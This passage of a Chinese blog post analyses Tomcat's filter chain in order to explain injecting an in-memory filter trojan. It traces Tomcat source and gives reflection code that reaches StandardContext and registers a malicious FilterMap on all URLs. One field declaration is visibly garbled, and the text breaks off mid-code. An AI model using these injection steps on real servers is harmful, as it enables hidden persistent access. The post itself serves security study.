class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;filterEvil&lt;/filter-name&gt;<br>    &lt;filter-class&gt;MemoryTrojan.filters.filterEvil&lt;/filter-class&gt;<br>&lt;/filter&gt;<br><br>&lt;filter-mapping&gt;<br>    &lt;filter-name&gt;filterEvil&lt;/filter-name&gt;<br>    &lt;url-pattern&gt;/evil&lt;/url-pattern&gt;<br>&lt;/filter-mapping&gt;<br></code></pre></td></tr></table></figure><h5 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h5><h6 id="创建过滤链"><a href="#创建过滤链" class="headerlink" title="创建过滤链"></a>创建过滤链</h6><blockquote><p>org.apache.catalina.core.StandardWrapperValve#createFilterChain 创建filter chain</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Create the filter chain for this request</span><br><span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span><br>        ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br></code></pre></td></tr></table></figure><blockquote><p>跟进createFilterChain</p><p>首先获取到context,然后从context中获取到filterMaps</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Acquire the filter mappings for this Context</span><br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<br>FilterMap filterMaps[] = context.findFilterMaps();<br></code></pre></td></tr></table></figure><blockquote><p>对filterMaps进行遍历,能匹配到Dispatcher、FiltersURL后,查找filterConfig,不为null则添加到filterChain</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Add the relevant path-mapped filters to this filter chain</span><br><span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>    <span class="hljs-keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>            context.findFilterConfig(filterMap.getFilterName());<br>    <span class="hljs-keyword">if</span> (filterConfig == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// FIXME - log configuration problem</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    filterChain.addFilter(filterConfig);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>addFilter中先检查是否重复,扩容,然后将filterConfig添加到filters中</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br><br>    <span class="hljs-comment">// Prevent the same filter being added multiple times</span><br>    <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>        <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>        ApplicationFilterConfig[] newFilters =<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>        System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>        filters = newFilters;<br>    &#125;<br>    filters[n++] = filterConfig;<br><br>&#125;<br></code></pre></td></tr></table></figure><h6 id="doFilter"><a href="#doFilter" class="headerlink" title="doFilter"></a>doFilter</h6><blockquote><p>org.apache.catalina.core.StandardWrapperValve#doFilter 执行过滤操作</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">filterChain.doFilter(request.getRequest(),response.getResponse());<br></code></pre></td></tr></table></figure><blockquote><p>if不满足,进入else分支</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><br>    <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>        <span class="hljs-keyword">try</span> &#123;<br>            java.security.AccessController.doPrivileged(<br>                    (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;<br>                        internalDoFilter(req,res);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                    &#125;<br>            );<br>        &#125; <span class="hljs-keyword">catch</span>( PrivilegedActionException pe) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> pe.getException();<br>            <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> ServletException) &#123;<br>                <span class="hljs-keyword">throw</span> (ServletException) e;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> IOException) &#123;<br>                <span class="hljs-keyword">throw</span> (IOException) e;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> RuntimeException) &#123;<br>                <span class="hljs-keyword">throw</span> (RuntimeException) e;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(e.getMessage(), e);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        internalDoFilter(request,response);   <span class="hljs-comment">//here</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>跟进internalDoFilter</p><p>首先从filters中获取到之前添加进去的filterConfig,再从filterConfig中获取到filter,然后执行filter.doFilter() 即进入自己编写的Filter实现类中执行</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">                              ServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><br>    <span class="hljs-comment">// Call the next filter if there is one</span><br>    <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter();<br><br>            <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                    filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>            &#125;<br>            <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                    ((HttpServletRequest) req).getUserPrincipal();<br><br>                Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                filter.doFilter(request, response, <span class="hljs-built_in">this</span>);    <span class="hljs-comment">//here</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            e = ExceptionUtils.unwrapInvocationTargetException(e);<br>            ExceptionUtils.handleThrowable(e);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(sm.getString(<span class="hljs-string">&quot;filterChain.filter&quot;</span>), e);<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h5><blockquote><p><code>createFilterChain</code>中首先拿到了StandardContext</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<br></code></pre></td></tr></table></figure><blockquote><p>ServletContext跟StandardContext的关系</p><p>Tomcat中的对应的ServletContext实现是ApplicationContext。在Web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例</p></blockquote><p><img src="/images/image-20221101174411776.png"></p><p><code>构造StandardContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>stdctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure><blockquote><p>然后从context中获取到FilterMaps,看一下FilterMaps</p><p>FilterMap的数组,FilterMap中包含filterName,urlPattern &#x2F;&#x2F;对应web.xml中<code>&lt;filter-mapping&gt;</code></p></blockquote><p><img src="/images/image-20221101162324623.png"></p><blockquote><p>看一下FilterMap类</p><p>setFilterName、addURLPattern来设置对应属性</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFilterName</span><span class="hljs-params">(String filterName)</span> &#123;<br>      <span class="hljs-built_in">this</span>.filterName = filterName;<br>  &#125;   <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addURLPattern</span><span class="hljs-params">(String urlPattern)</span> &#123;<br>      addURLPatternDecoded(UDecoder.URLDecode(urlPattern, getCharset()));<br>  &#125;<br></code></pre></td></tr></table></figure><blockquote><p>在遍历FilterMap中进行了 matchDispatcher 检测</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Add the relevant path-mapped filters to this filter chain</span><br><span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>    <span class="hljs-keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>跟进matchDispatcher</p><p>FilterMap.REQUEST&#x3D;8 </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">matchDispatcher</span><span class="hljs-params">(FilterMap filterMap, DispatcherType type)</span> &#123;<br>    <span class="hljs-keyword">switch</span> (type) &#123;<br>        <span class="hljs-keyword">case</span> FORWARD :<br>            <span class="hljs-keyword">if</span> ((filterMap.getDispatcherMapping() &amp; FilterMap.FORWARD) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> INCLUDE :<br>            <span class="hljs-keyword">if</span> ((filterMap.getDispatcherMapping() &amp; FilterMap.INCLUDE) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> REQUEST :<br>            <span class="hljs-keyword">if</span> ((filterMap.getDispatcherMapping() &amp; FilterMap.REQUEST) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> ERROR :<br>            <span class="hljs-keyword">if</span> ((filterMap.getDispatcherMapping() &amp; FilterMap.ERROR) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> ASYNC :<br>            <span class="hljs-keyword">if</span> ((filterMap.getDispatcherMapping() &amp; FilterMap.ASYNC) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>跟进getDispatcherMapping()</p><p>如果dispatcherMapping没设置的话返回 REQUEST &#x2F;&#x2F; REQUEST&#x3D;8</p><p>所以上面的matchDispatcher返回true,即不会进入if语句,所以新版tomcat可能不需要设置setDispatcher tomcat版本为9.0.65</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDispatcherMapping</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// per the SRV.6.2.5 absence of any dispatcher elements is</span><br>    <span class="hljs-comment">// equivalent to a REQUEST value</span><br>    <span class="hljs-keyword">if</span> (dispatcherMapping == NOT_SET) &#123;<br>        <span class="hljs-keyword">return</span> REQUEST;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> dispatcherMapping;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>FilterMap既然从StandardContext来就要回到StandardContext中去</p><p>StandardContext.java 中包括 addFilterMap，addFilterMapBefore</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilterMap</span><span class="hljs-params">(FilterMap filterMap)</span> &#123;<br>    validateFilterMap(filterMap);<br>    <span class="hljs-comment">// Add this filter mapping to our registered set</span><br>    filterMaps.add(filterMap);<br>    fireContainerEvent(<span class="hljs-string">&quot;addFilterMap&quot;</span>, filterMap);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilterMapBefore</span><span class="hljs-params">(FilterMap filterMap)</span> &#123;<br>    validateFilterMap(filterMap);<br>    <span class="hljs-comment">// Add this filter mapping to our registered set</span><br>    filterMaps.addBefore(filterMap);<br>    fireContainerEvent(<span class="hljs-string">&quot;addFilterMap&quot;</span>, filterMap);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>构造FilterMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>filterMap.setFilterName(name);<br><span class="hljs-comment">//filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 将filterMap 添加到 filterMaps中</span><br><span class="hljs-comment"> */</span><br>standardContext.addFilterMapBefore(filterMap);<br></code></pre></td></tr></table></figure><blockquote><p>然后从 context中 findFilterConfig </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>        context.findFilterConfig(filterMap.getFilterName());<br></code></pre></td></tr></table></figure><blockquote><p>跟进findFilterConfig</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> FilterConfig <span class="hljs-title function_">findFilterConfig</span><span class="hljs-params">(String name)</span> &#123;<br>    <span class="hljs-keyword">return</span> filterConfigs.get(name);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>看下 filterConfigs</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><blockquote><p>在 StandardContext#filterStart中进行了filterConfigs的添加</p><p>遍历filterDefs，将filterDef转为ApplicationFilterConfig，通过put()添加到filterConfigs</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">filterStart</span><span class="hljs-params">()</span> &#123;<br><br>    <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>        getLogger().debug(<span class="hljs-string">&quot;Starting filters&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// Instantiate and record a FilterConfig for each defined filter</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">ok</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">synchronized</span> (filterConfigs) &#123;<br>        filterConfigs.clear();<br>        <span class="hljs-keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey();<br>            <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>                getLogger().debug(<span class="hljs-string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue());<br>                filterConfigs.put(name, filterConfig);<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                t = ExceptionUtils.unwrapInvocationTargetException(t);<br>                ExceptionUtils.handleThrowable(t);<br>                getLogger().error(sm.getString(<br>                        <span class="hljs-string">&quot;standardContext.filterStart&quot;</span>, name), t);<br>                ok = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ok;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>看一下 ApplicationFilterConfig 的构造，参数可以传入 StandardContext，FilterDef</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">ApplicationFilterConfig(Context context, FilterDef filterDef)<br>        <span class="hljs-keyword">throws</span> ClassCastException, ReflectiveOperationException, ServletException,<br>        NamingException, IllegalArgumentException, SecurityException &#123;<br><br>    <span class="hljs-built_in">super</span>();<br><br>    <span class="hljs-built_in">this</span>.context = context;<br>    <span class="hljs-built_in">this</span>.filterDef = filterDef;<br></code></pre></td></tr></table></figure><blockquote><p>看一下 FilterDef</p><p>属性包含 filter、filterClass、fiterName &#x2F;&#x2F;对应web.xml中<code>&lt;filter&gt;</code></p></blockquote><p><img src="/images/image-20221101165037144.png"></p><blockquote><p>看下 FilterDef 类</p><p>通过以下函数来设置属性</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFilter</span><span class="hljs-params">(Filter filter)</span> &#123;<br>    <span class="hljs-built_in">this</span>.filter = filter;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFilterClass</span><span class="hljs-params">(String filterClass)</span> &#123;<br>    <span class="hljs-built_in">this</span>.filterClass = filterClass;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFilterName</span><span class="hljs-params">(String filterName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (filterName == <span class="hljs-literal">null</span> || filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<br>                sm.getString(<span class="hljs-string">&quot;filterDef.invalidFilterName&quot;</span>, filterName));<br>    &#125;<br>    <span class="hljs-built_in">this</span>.filterName = filterName;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>找一下FilterDefs</p><p>FilterDefs是StandardContext中的字段,即需要把构造好的FilterDef添加到standardContext</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Map&lt;String, FilterDef&gt; <span class="hljs-keyword">private</span> Map&lt;String, FilterDef&gt; filterDefs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><blockquote><p>StandardContext中addFilterDef</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilterDef</span><span class="hljs-params">(FilterDef filterDef)</span> &#123;<br><br>    <span class="hljs-keyword">synchronized</span> (filterDefs) &#123;<br>        filterDefs.put(filterDef.getFilterName(), filterDef);<br>    &#125;<br>    fireContainerEvent(<span class="hljs-string">&quot;addFilterDef&quot;</span>, filterDef);<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>构造FilterDef</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 